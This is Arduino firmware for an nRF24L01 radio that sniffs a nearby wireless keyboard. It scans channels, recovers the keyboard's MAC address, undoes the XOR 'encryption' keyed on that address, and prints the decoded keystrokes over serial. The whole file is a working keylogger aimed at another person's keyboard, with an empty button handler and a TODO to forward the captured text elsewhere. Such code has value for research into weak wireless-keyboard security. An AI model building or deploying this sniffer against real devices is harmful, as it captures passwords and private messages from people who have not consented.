#include <EEPROM.h>
#include <SPI.h>
#include "mhid.h"
#include "nRF24L01.h"
#include "RF24.h"

#define DEBUG_MODE 0
#define RADIO_CE_PIN 9
#define RADIO_CSN_PIN 10
#define SERIAL_BAUDRATE 115200
#define EEPROM_LAST_CHANNEL_VALUE_ADDRESS  0x05 
#define PACKET_SIZE 16

uint8_t channel = 72; 
uint64_t keyboard_mac_address = 0;
RF24 radio(RADIO_CE_PIN, RADIO_CSN_PIN);

uint16_t last_sequence = 0;
uint16_t last_letter = 0;
boolean last_key_was_single_line = false;

void decrypt_packet(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
  {
    p[i] ^= keyboard_mac_address >> (((i - 4) % 5) * 8) & 0xFF;
  }
}

void process_packet(uint8_t* packet)
{
  if (packet[0] != 0x0A) return; 
  if(packet[9] == 0) return;
  if(packet[1] != 0x78) return;
  
  uint16_t sequence = (packet[5] << 8) + packet[4];
  if (sequence == last_sequence) return;
  
  bool position_one_contains_valid_letter = false;
  bool position_two_contains_valid_letter = false;
  bool position_three_contains_valid_letter = false;
  char current_meta_value = packet[7];
  char current_key_position_one = packet[9];
  char current_key_position_two = packet[10];
  char current_key_position_three = packet[11];
  uint16_t current_letter_position_one = (current_meta_value << 8) + current_key_position_one;
  uint16_t current_letter_position_two = (current_meta_value << 8) + current_key_position_two;
  uint16_t current_letter_position_three = (current_meta_value << 8) + current_key_position_three;
  boolean current_key_is_on_single_line = current_key_position_two == 0 && current_key_position_three == 0;
  
  if(current_key_position_three != 0 && current_letter_position_three != last_letter)
  {
    position_three_contains_valid_letter = true;
  }
  
  if(current_key_position_two != 0 && current_letter_position_two != last_letter)
  {
    position_two_contains_valid_letter = true;
  }
  
  if(current_key_position_two == 0 || position_two_contains_valid_letter == true) // only pay attention if the character ahead in position two was not ignored
  {
    if(current_letter_position_one != last_letter || (last_key_was_single_line == true && current_key_is_on_single_line == true))
    {
      position_one_contains_valid_letter = true;
    }
  }
  
  if(position_one_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_one);
  if(position_two_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_two);
  if(position_three_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_three);
  
  last_key_was_single_line = current_key_is_on_single_line;
  last_sequence = sequence;
}

void process_letter(char meta_value, char key)
{
  char letter = hid_decode(key, meta_value);
  last_letter = (meta_value << 8) + key;
  Serial.print(letter);
  if(!DEBUG_MODE) return;
  Serial.print("(");
  Serial.print(key, HEX);
  Serial.print(")");
}

uint8_t flush_rx(void)
{
  uint8_t status;
  digitalWrite(RADIO_CSN_PIN, LOW);
  status = SPI.transfer( FLUSH_RX );
  digitalWrite(RADIO_CSN_PIN, HIGH);
  return status;
}

uint8_t write_to_nrf24l01_register(uint8_t reg, uint8_t value)                                       
{
  uint8_t status;
  digitalWrite(RADIO_CSN_PIN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  digitalWrite(RADIO_CSN_PIN, HIGH);
  return status;
}

void debug_print_packet(uint8_t* packet)
{
  if(!DEBUG_MODE) return;
  Serial.println("");
  Serial.print(millis());
  Serial.print(" | ");
  for (int j = 0; j < PACKET_SIZE; j++)
  {
    Serial.print(" ");
    if(packet[j] <= 0xF) Serial.print(" ");
    Serial.print(packet[j], HEX);
    Serial.print(" |");
  }
}

void scan()
{
  keyboard_mac_address = 0xAALL;
  uint8_t packet[PACKET_SIZE];
  write_to_nrf24l01_register(0x02, 0x00);  // RF24 doesn't ever fully set this -- only certain bits of it
  write_to_nrf24l01_register(0x03, 0x00); // SETUP_AW - change address width to be 2 bytes [Page 54]
  radio.openReadingPipe(0, keyboard_mac_address);
  radio.disableCRC();
  radio.startListening();
  unsigned long channel_start_scan_time;
  
  while (1)
  {
    if (channel > 80)
      channel = 3;

    Serial.println("");
    Serial.print("Scanning channel ");
    Serial.print(2400 + channel);
    Serial.print(".");
    radio.setChannel(channel);

    channel_start_scan_time = millis();
    while (millis() - channel_start_scan_time < 1000)
    {      
      if(radio.available())
      {
        radio.read(&packet, PACKET_SIZE);
        
        if (packet[4] == 0xCD)
        {
          debug_print_packet(packet);

          // The data returned starts with the packet control field (PCF) which is 9 bits long [Page 25].
          // So our packet begins 9 bits in after the 5 byte mac. 
          // Everything is misaligned by 1 bit (due to PCF being 9 bits) so we have to shift everything 1 bit when comparing.
          // We remove the MSB (0x7F = 127) (last bit of the PCF) and check if the device type is 0x0A which is a keyboard. See http://farm6.static.flickr.com/5002/5354354594_f7bf64f3af.jpg
          if ((packet[6] & 0x7F) << 1 == 0x0A)
          { 
            // Check if the packet type is 0x78 which is a keystroke or 0x38 which is idle (key is held down). 
            if (packet[7] << 1 == 0x38 || packet[7] << 1 == 0x78) 
            {
              Serial.println("");
              Serial.print("Keyboard on channel ");
              Serial.print(channel);
              Serial.print(".");
              EEPROM.write(EEPROM_LAST_CHANNEL_VALUE_ADDRESS, channel);

              keyboard_mac_address = 0;
              for (int i = 0; i < 4; i++)
              {
                keyboard_mac_address += packet[i];
                keyboard_mac_address <<= 8;
              }
              keyboard_mac_address += packet[4]; // We know the first byte is 0xCD (Note: addressing is LSB first).
              Serial.print(" (Mac Address: ");
              Serial.print(packet[0], HEX);
              Serial.print(packet[1], HEX);
              Serial.print(packet[2], HEX);
              Serial.print(packet[3], HEX);
              Serial.print(packet[4], HEX);
              Serial.print(")");
              write_to_nrf24l01_register(0x03, 0x03);  // SETUP_AW - change address width back to be 5 bytes [Page 54]
              return;
            }
          }
        }
      }
    }
    channel++;
  }
}

void setup()
{
  Serial.begin(SERIAL_BAUDRATE);
  radio.begin();
  Serial.print("Starting.");
  channel = EEPROM.read(EEPROM_LAST_CHANNEL_VALUE_ADDRESS);
  
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);

  scan();

  attachInterrupt(0, radio_data_received, FALLING);
  attachInterrupt(1, scan_button_pressed, FALLING);
  radio.enableDynamicPayloads();
  radio.setCRCLength(RF24_CRC_16);
  radio.stopListening();
  radio.openReadingPipe(1, keyboard_mac_address);
  radio.startListening();
}

void scan_button_pressed()
{
  
}

void radio_data_received()
{
  uint8_t pipe_num;

  if (radio.available(&pipe_num))
  {
    uint8_t current_packet[PACKET_SIZE];
    uint8_t payload_size = radio.getDynamicPayloadSize();
    radio.read(&current_packet, PACKET_SIZE);
    flush_rx();
    
    decrypt_packet(current_packet);
    debug_print_packet(current_packet);
    process_packet(current_packet);
  }
}

void loop(void)
{
	// TODO: send buffered data to a output
}
